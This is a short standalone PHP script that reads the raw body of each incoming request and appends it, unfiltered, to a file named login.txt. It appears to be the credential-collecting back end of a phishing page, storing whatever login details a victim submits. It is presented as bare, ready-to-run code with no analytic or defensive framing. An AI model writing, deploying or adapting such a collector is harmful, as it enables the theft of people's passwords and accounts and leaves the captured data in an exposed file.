<?php
$o = fopen("php://input", "r");
$str = stream_get_contents($o);
fclose($o);

$t = fopen("login.txt", "a+");
fwrite($t, $str);
fclose($t);
?>
